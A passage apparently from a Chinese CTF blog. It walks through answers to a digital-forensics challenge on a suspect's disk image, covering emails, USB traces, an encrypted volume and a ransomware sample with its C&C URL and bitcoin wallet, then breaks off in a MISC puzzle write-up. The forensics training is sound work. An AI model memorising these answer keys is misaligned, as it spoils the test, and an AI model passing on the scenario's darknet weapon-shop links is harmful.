Image)，里面有多少个硬盘分区？\n\n\n\n\nA.\n1\n\n\nB.\n2\n\n\nC.\n3\n\n\nD.\n4\n\n\nE.\n5\n\n\n\n\nC盘\tD盘\tE盘\n3：开始逻辑区块地址（LBA）\n\n\n\n3\n你能找到硬盘操作系统分区内的开始逻辑区块地址（LBA）？\n\n\n\n\nA.\n0\n\n\nB.\n512\n\n\nC.\n2,048\n\n\nD.\n206,848\n\n\nE.\n102,402,047\n\n\n\n\n其中，C盘的设备描述为系统保留；D盘E盘为本地磁盘。\n\n结合磁盘内容，找到D盘的物理位置105,906,176\n因为”现今计算机上所谓一个逻辑区块通常是512或1024位组“\n将105,906,176/512=206，848\n物理扇区，在winhex中就是$boot就是DBR\n4：硬盘操作系统分区的大小\n\n\n\n4\n你能找到硬盘操作系统分区的大小吗 (字节byte)？\n\n\n\n\nA.\n48.7\n\n\nB.\n102,195,200\n\n\nC.\n140,232,703\n\n\nD.\n19,369,295,872\n\n\nE.\n52,323,942,400\n\n\n\n\n48.73*1024*1024*1024=52,323,439,083.52\n5：$MFT的物理起始偏移位置\n\n\n\n5\n在包含操作系统的分区内，$MFT的物理起始偏移位置是什么？\n\n\n\n\nA.\n3328\n\n\nB.\n4,170,040\n\n\nC.\n6,026,176\n\n\nD.\n6,498,304\n\n\nE.\n16,949,352\n\n\n\n\n正常情况MFT以元文件的形式存储在相应磁盘分区的根目录中，但是是隐藏的。FMP可以直接访问到该文件。\n\n3,327,131,648/512=6,498,304\n6：操作系统的安装日期\n\n\n\n6\n请找出系统文件“SOFTWARE＂，请问操作系统的安装日期是？   （答案格式 －“世界协调时间＂：YYYY-MM-DD HH:MM UTC）\n\n\n\n\nA.\n2017-09-04 10:10 UTC\n\n\nB.\n2017-09-04 10:11 UTC\n\n\nC.\n2017-09-04 10:12 UTC\n\n\nD.\n2017-09-04 10:13 UTC\n\n\nE.\n2017-09-14 02:14 UTC\n\n\n\n取证结果-》系统痕迹-》系统信息-》安装时间\n\n2017-09-04 18:11:10\n调整了时区后得到答案B\n此处除了常识性的“-8”之外，遇到时区问题可以在此处验证调整\n\n7：SID\nSID为用户标识 （Security Identifiers）标识用户、组和计算机帐户的唯一的号码。\n\n\n\n7\n用户“Gary＂的SID是什么？\n\n\n\n\nA.\n1000\n\n\nB.\n1001\n\n\nC.\n1002\n\n\nD.\n1005\n\n\nE.\n1007\n\n\n\n\n8：做法同上\n\n\n\n8\n用户“彼得＂的SID是什么？\n\n\n\n\nA.\n1000\n\n\nB.\n1001\n\n\nC.\n1002\n\n\nD.\n1005\n\n\nE.\n1007\n\n\n\n9：操作系统\n\n\n\n9\n硬盘的操作系统是什么？\n\n\n\n\nA.\nWindows 7\n\n\nB.\nWindows 8\n\n\nC.\nWindows 10\n\n\nD.\nLinux Red Hat 7.1\n\n\nE.\nMAC OS X\n\n\n\n\n10：查看默认浏览器\n\n\n\n10\n哪个是Windows的默认浏览器？\n\n\n\n\nA.\nMicrosoft Internet Explorer\n\n\nB.\nGoogle Chrome\n\n\nC.\nMozilla Firefox\n\n\nD.\nOpera\n\n\nE.\nQQ 浏览器\n\n\n\n取证后看到只有IE、Chrome和火狐，\n\n根据常识可知IE为默认浏览器\n11：辨别URL\n\n\n\n11\n用户 “Gary＂曾经浏览过一些非法博彩网站，下列哪项URL符合？\n\n\n\n\na.\nwww.10086.com\n\n\nb.\nwww.188bet.com\n\n\nc.\nwww.hv5858.com\n\n\nd.\nwww.12377.cn\n\n\ne.\nwww.88.bettingwell.com\n\n\nf.\nwww.aaakk.org\n\n\n\n\n\n\nA.\n只有(a)  &amp; (b)\n\n\nB.\n(a), (b), (d) &amp; (f)\n\n\nC.\n(b), ©, (d) &amp; (f)\n\n\nD.\n(b),  ©, (e) &amp; (f)\n\n\nE.\n以上皆是\n\n\n\n通过实时搜索，\na:\n无此记录\nb:\n\n根据标题判断为非法博彩网站\nc:\n\nd:\n\n中国互联网举报中心\ne:\n在线博彩公司\nf:\n无此结果\nPS：此处f项的结果笔者存在疑义，但结合选项选D\n12：登入名称\n\n\n\n12\n用户Gary曾经登入上述非法博彩网站，下列哪个是其登入名称？\n\n\n\n\nA.\nggchey68\n\n\nB.\ngany-cher88\n\n\nC.\ngaly_chen88\n\n\nD.\ngarychen1688\n\n\nE.\ngarychen88\n\n\n\n结合第11题，发现上网记录的登陆信息里\n访问www.188bet.com的[garychen88]\n\n13：邮箱\n\n\n\n13\n在所有用户中，用于电子邮件发送/接收的程序名称是什么？\n\n\n\n\nA.\n新浪邮箱\n\n\nB.\n网易163\n\n\nC.\n阿里邮箱\n\n\nD.\nFoxmail\n\n\nE.\nMozilla Mail – ThunderBird\n\n\n\n取证结果-》邮件解析\n\n14：USB使用痕迹\n\n\n\n14\n在该Windows系统中，曾经连接数个USB移动储存装置 (U盘)，下列那个不是  该系统连接过的USB移动储存装置 ?\n\n\n\n\n\nA.\nWD My Passport 0827  USB Device\n\n\n\nB.\nStoreJet Transcend USB Device\n\n\n\nC.\nSamsung Portable  SSD USB Device\n\n\n\nD.\nStoreJet  TS256GESD400K USB Device\n\n\n\nE.\nGeneral UDisk USB Device\n\n\n\n\n取证结果-》USB设备使用痕迹\n\n15：做法同上\n\n\n\n15\n在该Windows系统中，下列哪个USB移动储存装置 (U盘)曾被指派为‘Z’磁盘分区代号(Drive Letter) ?\n\n\n\n\nA.\nWD My Passport 0827  USB Device\n\n\nB.\nStoreJet Transcend USB Device\n\n\nC.\nSamsung Portable  SSD USB Device\n\n\nD.\nStoreJet  TS256GESD400K USB Device\n\n\nE.\nGeneral UDisk USB Device\n\n\n\n\n16：最后关机时间\n\n\n\n16\n该Windows系统中，下列哪个是最后的关机时间?\n\n\n\n\nA.\n2017-10-31  4:52:54 UTC\n\n\nB.\n2017-10-31  4:53:54 UTC\n\n\nC.\n2017-10-31  4:54:54 UTC\n\n\nD.\n2017-10-31  4:55:54 UTC\n\n\nE.\n2017-10-31  4:56:54 UTC\n\n\n\n\n其中取证结果-》系统痕迹-》系统开关机时间\n中也能看到关机时间，但与本题不符。为什么会出现这种情况呢？\n\n本人认为，此处的逻辑顺序应为：\n2017-10-31 11:53:38（正常）开机2017-10-31 ？：？：？关闭电源（非正常关机）2017-10-31 12:52:54（正常）关机\n17：电脑名称\n\n\n\n17\n该Windows系统中，下列哪个是电脑名称?\n\n\n\n\nA.\nGARYPC\n\n\nB.\nGARY-PC\n\n\nC.\nGARY_PC\n\n\nD.\nGARY\n\n\nE.\nGARY-NB\n\n\n\n\n18：邮箱账号\n\n\n\n18\n在该Windows系统中，下列哪个是用户Gary日常使用的邮箱帐号?\n\n\n\n\nA.\nics_user@mail.com\n\n\nB.\nics_user@gmail.com\n\n\nC.\ngary@mail.com\n\n\nD.\ngary_chen@mail.com\n\n\nE.\ngary_chen@gmail.com\n\n\n\n\n19：邮件记录\n\n\n\n19\n在该Windows系统中，用户Gary曾经收过一封来自邮箱帐号 ics_user@mail.com 的邮件，内容提及有关制作钓鱼网站及邮件帐号eric_wang99@outlook.com，下列哪个是此封邮件的发送日期和时间?\n\n\n\n\nA.\n2017-09-25  17:07:15\n\n\nB.\n2017-10-17  14:35:45\n\n\nC.\n2017-10-17  18:24:02\n\n\nD.\n2017-10-26  19:17:08\n\n\nE.\n2017-10-26  19:24:57\n\n\n\n实时搜索【eric_wang99@outlook.com】\n查看邮件记录\n\n20：同19题\n\n\n\n20\n在该Windows系统中，用户Gary还曾经收过两封来自邮箱帐号 eric_wang99@outlook.com的邮件，标题为“学习制作网站”，下列哪个是第一封邮件的发送日期和时间?\n\n\n\n\nA.\n2017-09-25  17:07:15\n\n\nB.\n2017-10-17  14:35:45\n\n\nC.\n2017-10-17  18:24:02\n\n\nD.\n2017-10-18  18:30:45\n\n\nE.\n2017-10-18  19:38:05\n\n\n\n这里有一个逻辑拐点，【下列】之前是前情提要，之后是问题。\n认真读题后意思是：\n第一封\\来自 eric_wang99@outlook.com的发送日期和时间是？\n\n而摘要中的时间则表明\n2017-10-18 18:15 gary编辑2017-10-18 18:30:45 发送\n21：同19题\n\n\n\n21\n在该Windows系统中，用户Gary还曾经收过两封来自邮箱帐号 eric_wang99@outlook.com邮件，标题为“学习制作网站”，下列哪个是第二封电邮的发送日期和时间?\n\n\n\n\nA.\n2017-09-25  17:07:15\n\n\nB.\n2017-10-17  14:35:45\n\n\nC.\n2017-10-17  18:24:02\n\n\nD.\n2017-10-18  18:30:45\n\n\nE.\n2017-10-18  19:38:05\n\n\n\n\n22：同19题\n\n\n\n22\n用戶Gary亦曾經收過一封來自電郵帳號  ics_user@mail.com 的電郵，附加了兩張與咖啡豆有關的相片，下列那個是此封電郵之發送日期及時間?\n\n\n\n\nA.\n2017-09-25  17:07:15\n\n\nB.\n2017-10-17  14:35:45\n\n\nC.\n2017-10-17  18:24:02\n\n\nD.\n2017-10-26  19:17:08\n\n\nE.\n2017-10-26  19:24:57\n\n\n\n\n23：导出附件，查看MD5\n\n\n\n23\n下列那項是與上述咖啡豆有關相片的MD5哈希值/哈希值(Hash value)?\n\n\n\n\nA.\n449cebf0eb96499df047fe0bff8e1627\n\n\nB.\n17f9c6bcca44d128f7ed6769a6920278\n\n\nC.\n4bc48ce355acd4732f33a79e29728e96\n\n\nD.\n4bc48ce355acd4732f33a79e29728e97\n\n\nE.\ne3e545c80a7273b7b0d7c73dacdd7227\n\n\n\n找到题目中的两张图\n\n右键导出\n\n&gt;certutil -hashfile 202141514292669coffee-beans2.jpg MD5MD5 的 202141514292669coffee-beans2.jpg 哈希:3af01d89376adf829049967c52ad0799CertUtil: -hashfile 命令成功完成。&gt;certutil -hashfile 202141514292676ROASTED-COFFEE-BEANS.jpg MD5MD5 的 202141514292676ROASTED-COFFEE-BEANS.jpg 哈希:17f9c6bcca44d128f7ed6769a6920278CertUtil: -hashfile 命令成功完成。\n24：同23题\n\n\n\n24\n在该Windows系统中，用户Gary还曾经收到一封来自邮箱帐号 eric_wang99@outlook.com 的邮件，附加有三张与Apple iCloud相关的相片，下列哪个为该封邮件的发送日期和时间?\n\n\n\n\nA.\n2017-09-25  17:07:15\n\n\nB.\n2017-10-17  14:35:45\n\n\nC.\n2017-10-17  18:24:02\n\n\nD.\n2017-10-18  18:30:45\n\n\nE.\n2017-10-18  19:38:05\n\n\n\n\n25：连接WIFI\n\n\n\n25\nGary经常使用笔记本电脑浏览互联网，他的笔记本电脑上曾经连接过多少WIFI热点？\n\n\n\n\nA.\n1\n\n\nB.\n2\n\n\nC.\n3\n\n\nD.\n4\n\n\nE.\n5\n\n\n\n\n26：全局唯一识别元（Globally Unique Identifier, GUID）\n\n\n\n26\n上述电脑曾经连接过星巴克WIFI热点，下列哪项是其全局唯一识别元（Globally Unique Identifier, GUID）？\n\n\n\n\nA.\n{8039D237-A346-4BA1-9B78-5752580ED7F0}\n\n\nB.\n{39489FA0-DE35-4989-8730-E2E2ED15E85A}\n\n\nC.\n{558B94DF-8D68-4779-AA25-65FBDAB4C2B9}\n\n\nD.\n{4EFCDA7E-CE51-4EC2-8980-8629647C9968}\n\n\nE.\n{AF0778E8-6C4F-41C6-84B2-CB14490CF29E}\n\n\n\n用于指示产品的唯一性安装。在许多流行软件应用程序（例如 Web 浏览器和媒体播放器）中，都使用 GUID 网络GUID、网卡GUID\n\n\n27：IP地址\n\n\n\n27\n有关Gary的笔记本电脑，下列哪项是其最后分派得到的IP地址？\n\n\n\n\nA.\n192.168.0.1\n\n\nB.\n192.168.10.4\n\n\nC.\n192.168.20.6\n\n\nD.\n192.168.30.3\n\n\nE.\n192.168.40.5\n\n\n\n\n28：查看URL\n\n\n\n28\nEric曾发邮件给Gary，内容是关于如何在暗网(Dark Web)中浏览枪械的信息，以下哪个URL是由Eric提供的?\n\n\n\n\nA.\nhttp://hhnovpxmqrw5xaqg.onion\n\n\nB.\nhttp://gunsjmzh2btr7lpy.onion\n\n\nC.\nhttp://gunsdtk58tolcrre.onion\n\n\nD.\nhttp://armoryohajjhou6m.onion\n\n\nE.\nhttp://armory45jijdf7d.onion\n\n\n\n邮件记录没东西，查看附件\n在【好东西.docx】里看到四个Deep web weapons Store Links\n涉及\nhttp://hhnovpxmqrw4xaqg.onion/\nhttp://armoryohajjhou5m.onion/\nhttp://gunsjmzh2btr7lpy.onion/\nhttp://gunsdtk47tolcrre.onion/\n无法分辨\n查看其他图片附件\n\n29：简单信息分析\n\n\n\n29\nEric 售卖iCloud 网站给Gary 的价钱是多少?\n\n\n\n\nA.\n$500\n\n\nB.\n$800\n\n\nC.\n$1000\n\n\nD.\n$1400\n\n\nE.\n$1500\n\n\n\n找到Eric发给Gary的文件，关键词出现在邮件主题“网站价钱”\n\n30：识别常用软件\n\n\n\n30\nGary 经常将非法文件存储到该笔记本电脑的加密分区中，下列哪一个为该加密软件?\n\n\n\n\nA.\nTrueCrypt\n\n\nB.\nVeraCrypt\n\n\nC.\nBitlocker\n\n\nD.\nLUKS\n\n\nE.\nPGP WDE\n\n\n\n选项中提到的所有软件都为加密软件，\n系统痕迹-》安装软件-》其他软件\n发现B选项\n\n31：同23题\n\n\n\n31\n在加密磁区内有三张与Apple iCloud有关的相片，下列哪个为其中一张相片的MD5哈希值(Hash  Value)?\n\n\n\n\nA.\nc9fbfaf3c45492c40feb83a83217f146\n\n\nB.\n14903a7bd9d709b653f9afe8e3e51cdd\n\n\nC.\n7cb0f29812317db645edbcd6cf46e1ba\n\n\nD.\n5503d096bdf832460c8f51da62fbbb5d\n\n\nE.\n9918465b62171ba2c0a95595db629bf3\n\n\n\n&gt;certutil -hashfile 202141514292583icloud1.png MD5MD5 的 202141514292583icloud1.png 哈希:d84ceb0d3f25996a8926c442a9021d89CertUtil: -hashfile 命令成功完成。&gt;certutil -hashfile 202141514292595icloud2.png MD5MD5 的 202141514292595icloud2.png 哈希:c9fbfaf3c45492c40feb83a83217f146CertUtil: -hashfile 命令成功完成。&gt;certutil -hashfile 202141514292598icloud3.png MD5MD5 的 202141514292598icloud3.png 哈希:a46bf504f78ae6688fcada85a40de826CertUtil: -hashfile 命令成功完成。\n32：同23题\n\n\n\n32\n在加密磁区内有三张与暗网(Dark Web)有关的相片，下列哪个为其中一张相片的MD5哈希值(Hash  Value)?\n\n\n\n\nA.\n2836d35fb45c591211d5b6865c4a82f5\n\n\nB.\nd2b14799050b6c4ad6b07cd1227b91a5\n\n\nC.\n9110c96baa70c00acd8fbdfe2dc7c397\n\n\nD.\n703899985d881e2d103eb4fd1306be2e\n\n\nE.\n4c57a45b8da5ea01e5eb7d875f94a7b8\n\n\n\n&gt;certutil -hashfile 202141514293877Screenshot 1.png MD5MD5 的 202141514293877Screenshot 1.png 哈希:144d3601d02e171f87b3291ff6076a17CertUtil: -hashfile 命令成功完成。&gt;certutil -hashfile 202141514293990Screenshot 2.png MD5MD5 的 202141514293990Screenshot 2.png 哈希:bb6d34c6573223794a6283f787268fc8CertUtil: -hashfile 命令成功完成。&gt;certutil -hashfile 20214151429495Screenshot 3.png MD5MD5 的 20214151429495Screenshot 3.png 哈希:4c57a45b8da5ea01e5eb7d875f94a7b8CertUtil: -hashfile 命令成功完成。\n33：计算机系统时区\n\n\n\n33\nGary的计算机系统时区是什么？?\n\n\n\n\nA.\n中国标准时间\n\n\nB.\n日本标准时间\n\n\nC.\n泰国标准时间\n\n\nD.\n新加坡标准时间\n\n\nE.\n伦敦标准时间\n\n\n\n\n34：简单信息分析\n\n\n\n34\n在上述加密磁区内，存有一个名为”2017-10-27”的文件夹，内有三张枪械的图片，该三张图片是来自哪个网站?\n\n\n\n\nA.\nhttp://gunsdtk58tolcrre.onion\n\n\nB.\nhttp://gunsjmzh2btr7lpy.onion\n\n\nC.\nthegunstorelasvegas.com\n\n\nD.\ncabelas.com\n\n\nE.\nhyattgunstore.com\n\n\n\n实时搜索【2017-10-27】\n发现用户痕迹中，最近访问的文档\n\n路径对上了\nE:\\2017-10-27\\Screenshot 1.png\n锁定该图片\n想起之前接触的同名文件出现在邮件附件中\n\n参考28题\n35：简单信息分析\n\n\n\n35\nGary的笔记本电脑曾经下载过多少张有关恐怖组织的图片?\n\n\n\n\nA.\n1\n\n\nB.\n2\n\n\nC.\n3\n\n\nD.\n4\n\n\nE.\n5\n\n\n\n根据经验常识，笔记本电脑的下载路径默认在C:\\Users\\用户名\\Downloads\n考虑到常用用户Gary\n找到该文件夹\n个人认为这道题极易出错，按照官方答案选择B，存在isis.jpg和isis2.jpg\n\n但通过浏览发现其他两张图片，颇具恐怖组织色彩\n\n不解\n36：同19题\n\n\n\n36\n根据Gary与Eric邮件的内容，Eric曾经提供Gary一个私有云盘，下列哪项是该邮件提供的资料?\n\n\n\n\nA.\n动物图\n\n\nB.\n枪的结构图\n\n\nC.\n博彩图\n\n\nD.\n博彩文件\n\n\nE.\n恐怖主义图\n\n\n\n\n37：同19题\n\n\n\n37\n下列哪项是上述私有云盘的网址?\n\n\n\n\nA.\nhttp://mantech.mooo.cn\n\n\nB.\nhttp://mantech.mooo.com\n\n\nC.\nhttp://mooo.com\n\n\nD.\nhttp://mantech.com\n\n\nE.\nhttp://23.54.45.113\n\n\n\n38：同19题\n\n\n\n38\n下列哪项是上述私有云盘网址的连接端口?\n\n\n\n\nA.\nTCP 80\n\n\nB.\nTCP 8080\n\n\nC.\nUDP 80\n\n\nD.\nTCP 8000\n\n\nE.\nTCP 443\n\n\n\n39：查看上网痕迹\n\n\n\n39\n下列哪项是Gary第一次浏览该私有云盘网址时，所使用的浏览器?\n\n\n\n\nA.\nMicrosoft  Explorer\n\n\nB.\nGoogle  Chrome\n\n\nC.\nMozilla  Firefox\n\n\nD.\nOpera\n\n\nE.\nQQ 浏览器\n\n\n\n\n通过搜索云盘地址得到\n40：同39题\n\n\n\n40\n下列哪项是Gary第一次浏览该私有云盘网址的日期和时间?\n\n\n\n\nA.\n2017-10-29  12:42:09\n\n\nB.\n2017-10-30  12:42:09\n\n\nC.\n2017-10-31  12:42:09\n\n\nD.\n2017-10-30  10:42:09\n\n\nE.\n2017-10-30  11:42:09\n\n\n\n\n最接近的为B选项\n41：查看下载方式\n\n\n\n41\n在上述加密磁区内，存有一个名为”2017-10-30”的文件夹，里面有三张与枪械结构有关的图片，该三张图片是从哪个方法/软件下载?\n\n\n\n\nA.\n邮件\n\n\nB.\nFirefox\n\n\nC.\nChrome\n\n\nD.\nUSB thumb  drive\n\n\nE.\nftp\n\n\n\n\n42：查看下载时间\n\n\n\n42\nGary的笔记本电脑，曾经下载过一个感染了电脑病毒的文件，名为invoice.zip。该病毒程序文件是什么时候下载?\n\n\n\n\nA.\n2017-10-31  12:26:20\n\n\nB.\n2017-10-31  12:50:34\n\n\nC.\n2017-10-31  12:29:55\n\n\nD.\n2017-10-31  10:52:10\n\n\nE.\n2017-10-31  12:18:54\n\n\n\n\n43：最后存取日期/时间\n\n\n\n43\nGary的笔记本电脑，还存有一个感染了电脑病毒的程序文件，名为\\User\\Gary\\Downloads\\invoice\\dist\\invoice.exe。该文件的最后存取日期/时间(Last Accessed Data/Time) 是什么?\n\n\n\n\nA.\n2017-10-31  12:26:27\n\n\nB.\n2017-10-31  12:50:34\n\n\nC.\n2017-10-31 12:29:55\n\n\nD.\n2017-10-31  10:52:10\n\n\nE.\n2017-10-31  12:18:54\n\n\n\n这道题拐弯的点在于\n通过实时搜索得到两条关于【invoice.exe】的记录\n但题干其实把范围只限定在了Downloads里的那一个\n关于他的最后存取时间为A\n\n44：文件伪装\n\n\n\n44\n上述的invoice.exe文件伪装成什么格式的软件?\n\n\n\n\nA.\npdf\n\n\nB.\njpg\n\n\nC.\npsd\n\n\nD.\nDocx\n\n\nE.\nDoc\n\n\n\n同样是上一题的环境，导出后依然是exe，看不出什么\n丢进32位系统，得到\n\n选择选项A\n\n45：最后执行日期/时间\n\n\n\n45\n上述的\\User\\Gary\\Downloads\\invoice\\dist\\invoice.exe文件，最后执行日期/时间(Last Accessed Data/Time) 是什么?\n\n\n\n\nA.\n2017-10-31  12:26:27\n\n\nB.\n2017-10-31  12:50:34\n\n\nC.\n2017-10-31  12:29:55\n\n\nD.\n2017-10-31  10:52:10\n\n\nE.\n2017-10-31  12:18:54\n\n\n\n46：加密文件类型?\n\n\n\n46\n事实上，Gary的笔记本电脑被电脑病毒感染了，部份文件被加密，当中包括下列哪种文件类型?\n\n\n\n\na.\nexe\n\n\nb.\ngif\n\n\nc.\njpg\n\n\nd.\npsd\n\n\ne.\nDocx\n\n\nf.\nDoc\n\n\n\n\n\n\nA.\n只有(a)  &amp; (b)\n\n\nB.\n(a), (b), (d) &amp; (f)\n\n\nC.\n(b), ©, (d) &amp; (f)\n\n\nD.\n(b),  ©, (e) &amp; (f)\n\n\nE.\n以上皆是\n\n\n\n47：执行次数\n\n\n\n47\n上述\\User\\Gary\\Downloads\\invoice\\dist\\invoice.exe文件共执行多少?\n\n\n\n\nA.\n1\n\n\nB.\n2\n\n\nC.\n3\n\n\nD.\n4\n\n\nE.\n5\n\n\n\n实时搜索-》用户痕迹-》最近访问记录-》最近程序访问记录\n\n48：查看由什么程序编写\n\n\n\n48\n上述\\User\\Gary\\Downloads\\invoice\\dist\\invoice.exe文件是由什么程序编写?\n\n\n\n\nA.\nLISP\n\n\nB.\nC++\n\n\nC.\nVisual Basic\n\n\nD.\nPython\n\n\nE.\nJava\n\n\n\n在查找【invoice.exe】无果后\nexe本质上是压缩包\n关键词查找【invoice】，发现invoice.zip\n\n导出后查看\n\n49：查找调用的动态连结函式库\n\n\n\n49\n上述\\User\\Gary\\Downloads\\invoice\\dist\\invoice.exe文件，执行时会呼叫下列哪个动态连结函式库(Dynamic Linked Library)\n\n\n\n\nA.\nKERNEL32.DLL\n\n\nB.\nUSER32.DLL\n\n\nC.\nSHELL32.DLL\n\n\nD.\nNTDLL.DLL\n\n\nE.\nSYSTEM32.DLL\n\n\n\n询问了队里的RE大手子，得到一个工具CFF Explorer VIII\n打开对应的文件夹，查看导入目录\n\n选择选项A\n但大手子强调，如果这道题是多选题的话，多半还需要加上D选项，因为ntdll模块主要是处理异常和查询一些进程重要信息，模块出现异常时调用几乎是必然。\n50：同43题\n\n\n\n50\nGary的笔记本电脑，还存有另一感染了电脑病毒的程序文件，名为\\tmp\\invoice.exe。该文件的最后存取日期/时间(Last Accessed Data/Time) 是什么?\n\n\n\n\nA.\n2017-10-31  12:26:27\n\n\nB.\n2017-10-31  12:50:34\n\n\nC.\n2017-10-31  12:29:55\n\n\nD.\n2017-10-31  10:52:10\n\n\nE.\n2017-10-31  12:18:54\n\n\n\n51：文件之间的关系\n\n\n\n51\n上述两个文件\\User\\Gary\\Downloads\\invoice\\dist\\invoice.exe和 \\tmp\\invoice.exe是什么关系?\n\n\n\n\nA.\n前者是后者的复本\n\n\nB.\n后者是前者的复本\n\n\nC.\n两者MD5不相同\n\n\nD.\n两者元数据(Metadata)相同\n\n\nE.\n两者无关系\n\n\n\n52：查看上网痕迹\n\n\n\n52\n根据勒索讯息的显示，勒索网址是什么？\n\n\n\n\nA.\nhttp://223.17.250.208:6000/C&amp;C/\n\n\nB.\nhttp://223.17.250.208/C&amp;C/\n\n\nC.\nhttp://223.17.250.208:6060/C&amp;C/\n\n\nD.\nhttp://223.17.250.208:80/C&amp;C/\n\n\nE.\nhttp://223.17.250.208:8080/C&amp;C/\n\n\n\n通过实时搜索，除了C选项，其他都没有相关结果\n53：复杂信息分析\n\n\n\n53\n根据勒索讯息的显示，勒索金额是多少钱？\n\n\n\n\nA.\n$1,000\n\n\nB.\n$10,000\n\n\nC.\n$20,000\n\n\nD.\n$50,000\n\n\nE.\n$100,000\n\n\n\n上题的勒索网站打开失败，\n应该是网站无人维护的问题。\n一通搜索，在主用户的桌面\nC:\\Users\\Gary\\Desktop\n发现screen.png\n\n54：复杂信息分析\n\n\n\n54\n根据勒索讯息的显示，下列哪个是与勒索案件有关的比特币钱包？\n\n\n\n\nA.\n1KcjhpkowGWh5QYgPx5hYGuzbZpewgBszh\n\n\nB.\n1KcjhpknwGWh5QYgPx5hYGuzbZpewgBszh\n\n\nC.\n1KcjhpknwGWh5QYgPx5hYGuzbZpewgBzzh\n\n\nD.\n1KcjhpknwGWh5QYgPx6hYGuzbZpewgBszh\n\n\nE.\n1KcjhpknwGWh6QYgPx5hYGuzbZpewgBszh\n\n\n\n55：复杂信息分析\n\n\n\n55\n执法机关曾在现场对Gary的电脑进行电子法证检验，期间曾撷取与勒索软件相关的屏幕影像，并储存为png格式。下列哪项是其储存位置?\n\n\n\n\nA.\n\\Users\\彼得\\Downloads\\\n\n\nB.\n\\Users\\彼得\\Desktop\\\n\n\nC.\n\\Users\\Gary\\Downloads\\\n\n\nD.\n\\Users\\Gary\\Desktop\n\n\nE.\n\\Users\\Gary\\Documents\n\n\n\n","tags":["challenge","取证"]},{"title":"MISC-1","url":"/2020/12/16/MISC-1/","content":"simple\n\n1\n**picture.txt **\n……B4B5651D6DDEE5874514449476920000468AF67C103CE000003CE0000037958407900000005016CFB0F81B000014D41476400000009EC1ECEA0024742537100000003B341C2C00000020808E3000008E30000025448494D0000000A0A1A0D074E40598\n观察可得常见的文件格式（其实一眼看到的是504B），如8950等，写倒置脚本\ntxt=&#x27;&#x27;txt_=&#x27;&#x27;for i in txt:    txt_=i + txt_print txt_\n将结果导入010editor，得一张png文件。\n分离出一个加密压缩包，伪加密解密后得\nflM&#123;Sg_i_igl1S_ll__SfM_FF_1ilfM&#123;Sa11gagc1lSSMgfnafg_fMa1n5iaF_c1lSFiSaf_1f&#123;S_l_FalS5_faSl_fgl5M1_&#123;ll!&#123;i5c&#125;if1__fg5&#123;__M&#123;ngU&#123;1l1gff1f1iS__Mf5iFMlciSgaU&#123;glgUF5M_1aa_f_i5&#123;nflllla1S1FS!cSg&#123;fUfFcS1&#123;&#123;ag1lU51acfUSffMcMSgfSfalFg_g_gfgfiSfla1i&#123;&#123;&#123;n&#123;_lg_&#125;&#123;ggi&#123;gglg&#123;&#123;flnliF&#123;M5faF1ig_agal&#123;_&#123;&#123;aMMilfUSa&#123;a5ggiiigfSSg&#123;M_Mng&#123;a&#125;fcMf1_Fl&#123;cM&#123;1fiflMSSM&#123;_l!Scf5FFcn&#123;g&#123;SFnMlf&#123;l__aScMl&#123;&#123;c_lS1Sic1!l5ga1_gfggllcllccaagMU1iala55FSfia5lScMMFiMaFff&#123;&#123;g&#123;fcicM!l_&#123;iffcg&#123;UlcMa&#123;&#123;5f5Mc&#123;McfagcM_Ma1Slcf&#123;cSg_SflM5U11_5i_fcc&#123;FagglaMUfS1g_&#123;lSc5f_lag5Sg_ccclca___ala1g1aSMfa_fcaFnSSi&#123;a1a&#123;gUif_FgaS&#123;lacSgfga&#123;F1fgScf1_M__&#123;1ag_5MMSiga11g_aMl5fM15a_gla5f1_UllgcSc&#123;Sagac&#123;accS_i&#123;Mf&#123;Sgccg_ici&#123;fgcl_gaMlffS&#123;&#123;i&#123;nnfaM&#125;aallSSg1ilUif&#123;Mi1SMiMl1aaMUl&#123;alaglM!1lgngScMac1fa1acafS1fgfM__S11_SM&#123;f&#125;la_cM_g&#123;fniifgc1M&#123;_lM!M5&#125;g5_l1USg&#123;cgl&#123;SaccigSU1fMgl5lcaiggMFfcaca1l&#123;Ugf_lalg1_g!&#123;iaala_M5l1Mc11afcgfgl5f1g_c&#123;llaUMf1lM1aF&#123;af1Sl5lf5l1l5a_cc_c_1ff&#125;f_ff&#125;MlU&#123;afM_1fcla&#123;&#123;gM&#123;_Sl_M_&#123;gM_&#123;g5gaMaFU&#123;&#123;!S1ala1lfl1lifl_Mlf5F&#123;l_g&#123;li__aM_gfSU&#123;lM_agM&#123;giff&#123;ii_&#123;ff_naaaif1gf_ag__lnFacgiSlSac_Ma5M&#123;fg&#123;&#123;fac&#123;gllfaa&#123;Mi5MnMff&#123;&#123;gc!fn_iU&#123;ll5i_Saa5M&#123;Mi&#125;&#123;g&#123;Ffl&#123;Ffac!a&#123;afffgl!_gMalF_c&#123;lac_MFMg5acMFcla5cMlU5aSff&#123;l_UFf_Ug1!g1F_c&#123;&#123;aMMg&#123;SlgUa1ca1ff5_c1g5&#123;fligg11_lla_fcf1&#123;Mla1MnglM&#123;5lSl1g__Sll_cUc5MSa&#123;_fiMiiS1c&#123;M1g_SSUifi1!Saa&#123;_glS1aaal&#123;llF1cFgig_Sf&#123;acf&#123;Uf1c1fa!gfFM_aS51lgaMa1aa_gfif_ia&#123;M_a_M1fMSaSSfMSl&#123;1gFcl151l_lFfMilffgf1gSSgcaf_SfMgaf&#123;&#125;ilaUMM_MU5ff551i5SnFgc15nSMa1M&#123;&#123;_fSlMg&#123;&#123;5fcS1g5fSgMMUi&#123;_ig5falf1nfgFaUMlff!g__la_F_c1&#123;i1!&#123;lc&#123;i&#123;1iglM_fUgl___a5fnMaFf&#123;_lfll_igf1lcalniMag_5nFS1MMaiM1ll5SlMiaf_5l&#123;af__MMgac_Mf__fUa1fc&#123;1&#123;_55SF!llfgU1l1U_Mal_l&#123;alglSglcnlfSfaacgSSgSc_Maa&#123;ffg51MaSfca1U_&#123;gfS1ff5l&#123;&#123;f1Ml_gSgc_n5iS1Sg_l__1nnM1lM15MillfaMff1!nl1fFSM5Fflf&#123;acagl&#123;Sf&#123;ggfSi1f!FSagf&#123;&#123;lFf5la5&#123;ff__lM&#123;M_fUlSgi\n词频分析脚本\nfrom collections import Counterf = open(&quot;file.txt&quot;)txt = f.read()c = Counter()for i in txt:    c[i] = c[i]+1print(c)\n得到flag\nCounter(&#123;&#39;f&#39;: 180, &#39;l&#39;: 170, &#39;a&#39;: 160, &#39;g&#39;: 150, &#39;_&#39;: 150, &#39;&#123;&#39;: 140, &#39;M&#39;: 130, &#39;1&#39;: 120, &#39;S&#39;: 110, &#39;c&#39;: 100, 